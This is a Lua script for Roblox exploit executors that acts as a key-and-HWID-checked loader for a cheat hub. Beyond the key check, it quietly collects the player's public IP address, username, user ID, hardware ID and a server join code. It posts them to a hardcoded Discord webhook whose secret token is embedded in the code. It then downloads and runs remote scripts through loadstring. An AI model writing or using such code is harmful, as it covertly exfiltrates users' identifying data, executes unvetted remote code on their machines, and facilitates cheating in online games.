repeat wait() until game:IsLoaded() and game.Players.LocalPlayer

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local hwid = gethwid and gethwid() or "Unknown"
local key = getgenv().Key or nil

if not key then
    Players.LocalPlayer:Kick("⚠️ You must enter a key!")
    return
end

local keyCheckApi = "http://de1.bot-hosting.net:20328/check_key_ez?key=" .. key
local hwidCheckApi = "http://de1.bot-hosting.net:20328/Checkhwid?hwid=" .. hwid .. "&key=" .. key

local function getData(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success and response and response ~= "" then
        return HttpService:JSONDecode(response)
    end
    return nil
end

-- Kiểm tra key có tồn tại không
local keyCheck = getData(keyCheckApi)
if not keyCheck or keyCheck.status ~= "true" then
    Players.LocalPlayer:Kick("⚠️ Invalid key.")
    return
end

-- Kiểm tra HWID
local hwidCheck = getData(hwidCheckApi)
if not hwidCheck or hwidCheck.status ~= "true" then
    Players.LocalPlayer:Kick(hwidCheck and hwidCheck.message or "⚠️ Invalid HWID.")
    return
end

--Post Webhook
local localPlayer = Players.LocalPlayer
local username = localPlayer.Name
local userId = localPlayer.UserId
local jobId = game.JobId
local joinCode = game:GetService("TeleportService"):ReserveServer(game.PlaceId)
local ip = "Unknown"

pcall(function()
    local result = game:HttpGet("https://api.ipify.org?format=json")
    local data = HttpService:JSONDecode(result)
    ip = data.ip or "Unknown"
end)

-- Webhook gửi log
local webhookUrl = "https://discord.com/api/webhooks/1359739768635658240/a3hd4OSufYS_dNsRH49fQTn34omq3w7Ea7SkOJG5x0ucC6x5iUV4AO5x2_txocOn-WYt"

local payload = {
    ["username"] = "Check User",
    ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/3064/3064197.png",
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "🔐 Key Validation Log",
        ["description"] = "**1 Thg daden vừa chạy sì ríp lỏ**",
        ["color"] = 0x00FFFF,
        ["thumbnail"] = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png" },
        ["fields"] = {
            { name = "👤 Username", value = username, inline = true },
            { name = "🆔 UserID", value = tostring(userId), inline = true },
            { name = "🌐 IP Address", value = ip, inline = false },
            { name = "🧾 Job ID", value = jobId, inline = false },
            { name = "🔗 Join Code", value = joinCode, inline = true },
            { name = "🔒 HWID", value = hwid, inline = true },
        },
        ["footer"] = {
            text = "🕒 " .. os.date("%d/%m/%Y %H:%M:%S"),
            icon_url = "https://share.creavite.co/678cc3be0ae0e4f686a66bfa.gif"
        }
    }}
}

local success, err = pcall(function()
    http_request({
        Url = webhookUrl,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end)

-- Chạy script theo game
local gameScripts = {
    [2753915549] = function()
        getgenv().Language = "English"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Dex-Bear/Vxezehub/refs/heads/main/VxezeHubMain2"))()
    end,
    [4442272183] = function()
        getgenv().Language = "English"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Dex-Bear/Vxezehub/refs/heads/main/VxezeHubMain2"))()
    end,
    [7449423635] = function()
        getgenv().Language = "English"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Dex-Bear/Vxezehub/refs/heads/main/VxezeHubMain2"))()
    end,
    [116495829188952] = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Dex-Bear/Vxezehub/main/Npclockdeadrails"))()
    end
}

local scriptFunction = gameScripts[game.PlaceId]
if scriptFunction then
    scriptFunction()
else
    Players.LocalPlayer:Kick("⚠️ This game is not supported.")
end
